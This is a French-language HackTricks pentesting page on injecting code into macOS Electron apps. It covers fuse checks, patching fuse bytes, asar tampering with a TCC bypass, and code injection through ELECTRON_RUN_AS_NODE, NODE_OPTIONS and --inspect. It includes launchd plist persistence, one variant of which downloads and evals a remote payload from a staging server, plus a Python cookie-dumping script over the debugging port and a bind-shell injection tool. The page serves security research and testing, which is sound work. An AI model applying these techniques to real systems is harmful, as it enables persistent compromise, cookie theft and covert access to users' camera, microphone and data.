# Injection dans les applications Electron macOS

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations de base

Si vous ne savez pas ce qu'est Electron, vous pouvez trouver [**beaucoup d'informations ici**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Mais pour l'instant, sachez simplement qu'Electron exécute **node**.\
Et node a certains **paramètres** et **variables d'environnement** qui peuvent être utilisés pour **lui faire exécuter d'autre code** en plus du fichier indiqué.

### Fusibles Electron

Ces techniques seront discutées ensuite, mais récemment, Electron a ajouté plusieurs **drapeaux de sécurité pour les prévenir**. Ce sont les [**Fusibles Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) et voici ceux utilisés pour **empêcher** les applications Electron sur macOS de **charger du code arbitraire** :

* **`RunAsNode`** : S'il est désactivé, cela empêche l'utilisation de la variable d'environnement **`ELECTRON_RUN_AS_NODE`** pour injecter du code.
* **`EnableNodeCliInspectArguments`** : S'il est désactivé, des paramètres comme `--inspect`, `--inspect-brk` ne seront pas respectés. Évitant ainsi l'injection de code.
* **`EnableEmbeddedAsarIntegrityValidation`** : S'il est activé, le fichier **`asar`** chargé sera **validé** par macOS. **Empêchant** ainsi **l'injection de code** en modifiant le contenu de ce fichier.
* **`OnlyLoadAppFromAsar`** : S'il est activé, au lieu de chercher à charger dans l'ordre suivant : **`app.asar`**, **`app`** et enfin **`default_app.asar`**. Il vérifiera et utilisera uniquement app.asar, garantissant ainsi que, **combiné** avec le fusible **`embeddedAsarIntegrityValidation`**, il est **impossible** de **charger du code non validé**.
* **`LoadBrowserProcessSpecificV8Snapshot`** : S'il est activé, le processus du navigateur utilise le fichier appelé `browser_v8_context_snapshot.bin` pour son instantané V8.

Un autre fusible intéressant qui n'empêchera pas l'injection de code est :

* **EnableCookieEncryption** : S'il est activé, le stockage des cookies sur disque est chiffré en utilisant les clés de cryptographie du système d'exploitation.

### Vérification des fusibles Electron

Vous pouvez **vérifier ces drapeaux** d'une application avec :
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modification des fusibles Electron

Comme le [**mentionnent les docs**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), la configuration des **fusibles Electron** est configurée à l'intérieur du **binaire Electron** qui contient quelque part la chaîne **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

Dans les applications macOS, cela se trouve typiquement dans `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Vous pouvez charger ce fichier dans [https://hexed.it/](https://hexed.it/) et rechercher la chaîne précédente. Après cette chaîne, vous pouvez voir en ASCII un nombre "0" ou "1" indiquant si chaque fusible est désactivé ou activé. Modifiez simplement le code hexadécimal (`0x30` est `0` et `0x31` est `1`) pour **modifier les valeurs des fusibles**.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Notez que si vous essayez de **remplacer** le binaire **`Electron Framework`** à l'intérieur d'une application avec ces octets modifiés, l'application ne fonctionnera pas.

## RCE ajoutant du code aux applications Electron

Il pourrait y avoir des **fichiers JS/HTML externes** qu'une application Electron utilise, donc un attaquant pourrait injecter du code dans ces fichiers dont la signature ne sera pas vérifiée et exécuter du code arbitraire dans le contexte de l'application.

{% hint style="danger" %}
Cependant, il y a actuellement 2 limitations :

* La permission **`kTCCServiceSystemPolicyAppBundles`** est **nécessaire** pour modifier une application, donc par défaut cela n'est plus possible.
* Le fichier **`asap`** compilé a généralement les fusibles **`embeddedAsarIntegrityValidation`** `et` **`onlyLoadAppFromAsar`** `activés`

Rendant ce chemin d'attaque plus compliqué (ou impossible).
{% endhint %}

Notez qu'il est possible de contourner l'exigence de **`kTCCServiceSystemPolicyAppBundles`** en copiant l'application dans un autre répertoire (comme **`/tmp`**), en renommant le dossier **`app.app/Contents`** en **`app.app/NotCon`**, **modifiant** le fichier **asar** avec votre code **malveillant**, en le renommant à nouveau en **`app.app/Contents`** et en l'exécutant.

Vous pouvez décompresser le code du fichier asar avec :
```bash
npx asar extract app.asar app-decomp
```
Et le reconditionner après l'avoir modifié avec :
```bash
npx asar pack app-decomp app-new.asar
```
## Exécution de code à distance avec `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Selon [**la documentation**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), si cette variable d'environnement est définie, elle démarrera le processus comme un processus Node.js normal.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Si le fusible **`RunAsNode`** est désactivé, la variable d'environnement **`ELECTRON_RUN_AS_NODE`** sera ignorée, et cela ne fonctionnera pas.
{% endhint %}

### Injection depuis le Plist de l'application

Comme [**proposé ici**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), vous pourriez abuser de cette variable d'environnement dans un plist pour maintenir la persistance :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## Exécution de code à distance (RCE) avec `NODE_OPTIONS`

Vous pouvez stocker le payload dans un fichier différent et l'exécuter :

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Si le fusible **`EnableNodeOptionsEnvironmentVariable`** est **désactivé**, l'application **ignorera** la variable d'environnement **NODE\_OPTIONS** lors du lancement à moins que la variable d'environnement **`ELECTRON_RUN_AS_NODE`** ne soit définie, qui sera également **ignorée** si le fusible **`RunAsNode`** est désactivé.

Si vous ne définissez pas **`ELECTRON_RUN_AS_NODE`**, vous rencontrerez **l'erreur** : `La plupart des NODE_OPTIONs ne sont pas prises en charge dans les applications empaquetées. Consultez la documentation pour plus de détails.`
{% endhint %}

### Injection depuis le Plist de l'application

Vous pourriez abuser de cette variable d'environnement dans un plist pour maintenir la persistance en ajoutant ces clés :
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Exécution de code à distance avec inspection

Selon [**cet article**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), si vous exécutez une application Electron avec des drapeaux tels que **`--inspect`**, **`--inspect-brk`** et **`--remote-debugging-port`**, un **port de débogage sera ouvert** afin que vous puissiez vous y connecter (par exemple depuis Chrome à l'adresse `chrome://inspect`) et vous serez capable d'**injecter du code** ou même de lancer de nouveaux processus.\
Par exemple :

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Si le fusible **`EnableNodeCliInspectArguments`** est désactivé, l'application **ignorera les paramètres node** (tels que `--inspect`) lors du lancement à moins que la variable d'environnement **`ELECTRON_RUN_AS_NODE`** ne soit définie, qui sera également **ignorée** si le fusible **`RunAsNode`** est désactivé.

Cependant, vous pourriez toujours utiliser le paramètre **electron `--remote-debugging-port=9229`** mais le payload précédent ne fonctionnera pas pour exécuter d'autres processus.
{% endhint %}

En utilisant le paramètre **`--remote-debugging-port=9222`**, il est possible de voler certaines informations de l'application Electron comme l'**historique** (avec des commandes GET) ou les **cookies** du navigateur (car ils sont **déchiffrés** à l'intérieur du navigateur et il y a un **point de terminaison json** qui les donnera).

Vous pouvez apprendre comment faire cela [**ici**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) et [**là**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) et utiliser l'outil automatique [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) ou un script simple comme :
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
Dans [**ce billet de blog**](https://hackerone.com/reports/1274695), ce débogage est exploité pour faire télécharger à Chrome en mode headless **des fichiers arbitraires dans des emplacements arbitraires**.

### Injection depuis le Plist de l'application

Vous pourriez abuser de cette variable d'environnement dans un plist pour maintenir la persistance en ajoutant ces clés :
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Contournement de TCC en abusant des Anciennes Versions

{% hint style="success" %}
Le démon TCC de macOS ne vérifie pas la version exécutée de l'application. Donc, si vous **ne pouvez pas injecter de code dans une application Electron** avec une des techniques précédentes, vous pourriez télécharger une version antérieure de l'APP et y injecter du code car elle conservera toujours les privilèges TCC (à moins que le Trust Cache ne l'empêche).
{% endhint %}

## Exécuter du Code non JS

Les techniques précédentes vous permettront d'exécuter **du code JS à l'intérieur du processus de l'application Electron**. Cependant, rappelez-vous que les **processus enfants s'exécutent sous le même profil de sandbox** que l'application parente et **héritent de leurs permissions TCC**.\
Par conséquent, si vous souhaitez abuser des droits pour accéder à la caméra ou au microphone par exemple, vous pourriez simplement **exécuter un autre binaire depuis le processus**.

## Injection Automatique

L'outil [**electroniz3r**](https://github.com/r3ggi/electroniz3r) peut être facilement utilisé pour **trouver des applications Electron vulnérables** installées et y injecter du code. Cet outil essaiera d'utiliser la technique **`--inspect`** :

Vous devez le compiler vous-même et pouvez l'utiliser comme ceci :
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Références

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
